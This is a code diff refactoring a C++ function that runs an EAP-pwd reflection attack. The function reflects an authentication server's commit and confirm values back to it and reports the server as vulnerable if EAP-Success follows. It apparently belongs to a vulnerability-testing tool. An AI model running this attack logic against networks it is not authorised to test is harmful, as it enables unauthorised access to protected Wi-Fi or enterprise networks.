@@ -26,29 +26,8 @@ bool run_reflection_exchange(EAP_Att &eap_att){
 	// poll for an EAPOL frame satisfying pred, or EAP-Success (returned as empty vector).
 	// returns nullopt on timeout or interrupt.
 
-	// EAP-Identity
-	{
-		uint8_t eap_id = 0;
-		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){ return is_identity_request(e, eap_id); });
-		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
-		//if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
-		log(LogLevel::INFO, "EAP-Identity Request id={}", static_cast<int>(eap_id));
-		send_eapol(eap_att, build_identity_response(eap_id, eap_att.identity));
-	}
-
-	// PWD-ID
-	{
-		optional<EapPwdFrame> frame;
-		const auto eapol = wait_eapol(eap_att,[&](const vector<uint8_t>& e){
-			const auto f = parse_eap_pwd(e);
-			if(f && f->opcode == eap::PWD_OPCODE_ID){ frame = f; return true; }
-			return false;
-		});
-		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
-		//if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
-		log(LogLevel::INFO, "EAP-PWD-ID Request");
-		send_eapol(eap_att, build_pwd_id_response(*frame, eap_att.identity));
-	}
+	if(send_eap_normal_EAP(eap_att)) return false;
+	if(send_eap_normal_EAP_pwd_ID(eap_att)) return false;
 
 	// COMMIT
 	{
@@ -58,7 +37,7 @@ bool run_reflection_exchange(EAP_Att &eap_att){
 			if(f && f->opcode == eap::PWD_OPCODE_COMMIT){ frame = f; return true; }
 			return false;
 		});
-		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
+		if(!eapol){ log(LogLevel::WARNING, "EAP commit ended without success"); return false; }
 		//if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
 		log(LogLevel::INFO, "EAP-PWD-Commit Request – reflecting scalar+element");
 		send_eapol(eap_att, reflect_commit(*frame));
@@ -72,26 +51,12 @@ bool run_reflection_exchange(EAP_Att &eap_att){
 			if(f && f->opcode == eap::PWD_OPCODE_CONFIRM){ frame = f; return true; }
 			return false;
 		});
-		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
-		//if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
+		if(!eapol){ log(LogLevel::WARNING, "EAP confirm exchange ended without success"); return false; }
 		log(LogLevel::INFO, "EAP-PWD-Confirm Request – reflecting confirm value");
 		send_eapol(eap_att, reflect_confirm(*frame));
 	}
 
-	// Wait for EAP-Success after confirm
-	{
-		const auto eapol = wait_eapol(eap_att, [](const vector<uint8_t>&){
-			return false;
-		});
-		if(!eapol.has_value()){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
-		if(eapol->empty()){
-			log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!");
-			return true;
-		}
-	}
-
-	log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success");
-	return false;
+	return eap_pwd_wait_for_success(eap_att);
 }
 
 void setup_attack(RunStatus &rs){
